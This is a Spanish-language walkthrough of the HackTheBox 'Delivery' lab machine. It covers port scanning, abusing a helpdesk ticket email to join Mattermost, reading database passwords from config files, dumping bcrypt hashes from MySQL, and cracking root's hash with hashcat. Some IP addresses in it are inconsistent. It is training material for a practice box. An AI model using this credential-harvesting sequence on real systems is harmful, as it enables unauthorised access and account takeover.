# Máquina "Delivery" de HackTheBox

## Características

- External
- TicketTrick
- A04:2021-Insecure Design
- Impersonation 
- Weak Credentials
- A07:2021-Identification And Authentication Failures 
- Public Vulnerabilities
- Extracting database credentials from Mattermost  
- Cracking Password using hashcat rule based attack
- Cracking the password using john the ripper

**IP:** 10.10.10.222

## Escaneo Nmap

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.149.69
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 18:23 EST
Nmap scan report for 10.10.10.222
Host is up (0.048s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
```

Al lanzar nmap se encontraron tres servicios:

- **22:** SSH - Generalmente no es explotable, pero es bueno saberlo si se obtienen las credenciales.
- **80:** Servidor web - Mayor vector de ataque. Necesita una mayor enumeración.
- **8065:** Servicio desconocido - Parece que se ejecuta algún tipo de servicio web según los scripts de nmap.

![Delivery Web](/secciones/posts/imagenes/delivery/delivery1.png)

Al agregar el puerto 8065 a la web nos envió a una plataforma de Mattermost que es una especie de chat empresarial. Luego, al ver el código fuente de la página, se vieron los dominios.

- http://helpdesk.delivery.htb/
- http://delivery.htb:8065/

Agregamos ambos enlaces al `/etc/hosts` ya que no son accesibles.

## Configuración de hosts

```bash
# Agregamos /etc/hosts
10.10.10.222  delivery.htb
10.10.10.222  helpdesk.delivery.htb
```

Servicios identificados:
- **Mesa de ayuda:** Sistema de tickets de soporte osTicket
- **MatterMost:** El servicio desconocido que se ejecuta en 8065

```bash
nmap --script http-enum -p80 10.10.10.214 -oN webScan
```

Mientras tanto, iremos por Mattermost.

![Mattermost](/secciones/posts/imagenes/delivery/mattermost1.png)

Se trata de un software escrito en Go. No se encontró nada en ExploitDB. Tenía habilitada la opción de registrarse pero pide autenticación, así que por ahora no podemos hacer nada.

## Análisis del Helpdesk

![Helpdesk](/secciones/posts/imagenes/delivery/helpdesk.png)

Parece ser un sistema de soporte basado en tickets. No podemos determinar qué versión del software se está ejecutando. Hay varios exploits en ExploitDB pero no son aplicables, así que abriremos un ticket.

Releyendo la sección "Contáctenos" del sitio web principal, dice que para acceder al servicio MatterMost es necesario ponerse en contacto con el servicio de asistencia técnica.

![Crear ticket](/secciones/posts/imagenes/delivery/create-ticket.png)

Nos devuelve un mensaje exitoso con un ID de ticket y un correo temporal.

## Accediendo a MatterMost 

Ingresamos a Mattermost y en "check ticket status" ponemos el ID del ticket que nos entregaron.

![ID Ticket](/secciones/posts/imagenes/delivery/idtick.webp)

Confirmamos la cuenta.

![Confirmar cuenta](/secciones/posts/imagenes/delivery/confirmacount.webp)

Tras la confirmación, de nuevo en helpdesk vemos otro ticket donde se entrega clave y usuario SSH.

![Credenciales](/secciones/posts/imagenes/delivery/creds.png)

Con esto ya tenemos la flag de user.

## Enumeración de la base de datos

Continuamos enumerando la base de datos que contenía los tickets antes vistos:

```bash
maildeliverer@Delivery:/var/www/osticket/upload$ grep -ir dbuser
include/ost-sampleconfig.php:define('DBUSER','%CONFIG-DBUSER');
include/ost-config.php:define('DBUSER','ost_user');
bootstrap.php:        if (!db_connect(DBHOST, DBUSER, DBPASS, $options)) {
```

Encontramos las credenciales de la base de datos:
```php
define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','ost_user');
define('DBPASS','!H3lpD3sk123!');
```

Accedemos a MySQL:

```bash
maildeliverer@Delivery:/var/www/osticket/upload$ mysql -u ost_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 320
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| osticket           |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use osticket;
MariaDB [osticket]> show tables;
```

Exploramos la tabla de usuarios:

```sql
MariaDB [osticket]> select * from ost_user;
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
| id | org_id | default_email_id | status | name                             | created             | updated             |
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
|  1 |      1 |                1 |      0 | osTicket Support                 | 2020-12-26 09:14:00 | 2020-12-26 09:14:00 |
|  2 |      0 |                2 |      0 | bob                              | 2021-01-05 03:26:08 | 2021-01-05 03:26:08 |
|  3 |      0 |                3 |      0 | 9ecfb4be145d47fda0724f697f35ffaf | 2021-01-05 06:06:28 | 2021-01-05 06:06:28 |
|  4 |      0 |                4 |      0 | c3ecacacc7b94f909d04dbfd308a9b93 | 2021-01-05 06:06:39 | 2021-01-05 06:06:39 |
|  5 |      0 |                5 |      0 | ff0a21fc6fc2488195e16ea854c963ee | 2021-01-05 06:06:45 | 2021-01-05 06:06:45 |
|  6 |      0 |                6 |      0 | 5b785171bfb34762a933e127630c4860 | 2021-01-05 06:06:46 | 2021-01-05 06:06:46 |
|  7 |      0 |                7 |      0 | foxtrot                          | 2021-04-27 14:07:26 | 2021-04-27 14:07:26 |
|  8 |      0 |                8 |      0 | foxtrot_user                     | 2021-04-27 14:22:07 | 2021-04-27 14:22:07 |
|  9 |      0 |                9 |      0 | foxtroto                         | 2021-04-27 14:31:03 | 2021-04-27 14:31:03 |
| 10 |      0 |               10 |      0 | foxtrot                          | 2021-04-27 14:54:04 | 2021-04-27 14:54:04 |
| 11 |      0 |               11 |      0 | hal9kb                           | 2021-04-27 15:26:57 | 2021-04-27 15:26:57 |
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
```

También encontramos cuentas de usuario:

```sql
MariaDB [osticket]> select * from ost_user_account;
+----+---------+--------+--------------------+------+----------+--------------------------------------------------------------+---------+-------+---------------------+
| id | user_id | status | timezone           | lang | username | passwd                                                       | backend | extra | registered          |
+----+---------+--------+--------------------+------+----------+--------------------------------------------------------------+---------+-------+---------------------+
|  1 |       7 |      0 | Africa/Addis_Ababa | NULL | NULL     | $2a$08$.V/t535Q6e0ybqkojE13xesj.emk5.ykkRW.gQdM/qhmWubcNulpe | NULL    | NULL  | 2021-04-27 14:07:26 |
|  2 |       9 |      0 | NULL               | NULL | NULL     | $2a$08$2RX0THiRcuWmPDBVU1.4ZeurpTF49bQXWy/5LkPBDwfaRB62H4lEa | NULL    | NULL  | 2021-04-27 14:53:18 |
+----+---------+--------+--------------------+------+----------+--------------------------------------------------------------+---------+-------+---------------------+
```

El archivo de configuración de MatterMost que se encuentra en `/opt/mattermost/config/config.json` contiene credenciales para la base de datos MySQL. El nombre de usuario y la contraseña están en texto sin formato y se pueden utilizar para iniciar sesión en la base de datos.

```bash
mysql -u mmuser -D mattermost -p
```

## Extracción de hash de root

Extraemos la contraseña de root de la base de datos de Mattermost:

```sql
MariaDB [mattermost]> select username, password from Users;
+----------------------------------+--------------------------------------------------------------+
| username                         | password                                                     |
+----------------------------------+--------------------------------------------------------------+
| foxtrot2                         | $2a$10$eCR7u4cUHAHJbQnZY1LK5OMkHSqu.8gC1DBhMtgr3HxZGz75TV6p6 |
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| delivery                         | $2a$10$QELx6anUOb8scA.w.tiDoeZSJ1lWq0onfQcrSld0dwdMljPIz0C.K |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
| foxtrot_user                     | $2a$10$OKV39TdX5.JAtw2Z7rb/.uIBAHssg5hih8nmvVGtB.CS2Md/z0mSS |
| foxtrot                          | $2a$10$s1wj2Xpo9hwYg5C403GJtuIkXjhquiVzlXPhrEBIndVCJXFGXi4Yq |
| username_foxtrot                 | $2a$10$1yCrOD55v/L3Ksukq.h3IupgThUth587xQRqf/HuXX8VIIXp67cwq |
+----------------------------------+--------------------------------------------------------------+
12 rows in set (0.000 sec)
```

Ahora tenemos el hash de root, el cual guardaremos en un archivo para descifrarlo con Hashcat.

Primero buscaremos el tipo de cifrado usando `hashid`:

```bash
hashid $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

Obtenemos:
- [+] Blowfish(OpenBSD) 
- [+] Woltlab Burning Board 4.x 
- [+] bcrypt 

Es bcrypt.

## Escalada de privilegios

Usaremos una regla de GitHub para descifrar con Hashcat:

https://github.com/NotSoSecure/password_cracking_rules

```bash
hashcat -a 0 -m 3200 hash.txt list.txt -r OneRuleToRuleThemAll.rule -o cracked
```

Una vez crackeada la contraseña, accedemos como root:

```bash
su - root
```

¡Y listo! Tenemos acceso root y la flag correspondiente.

---

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.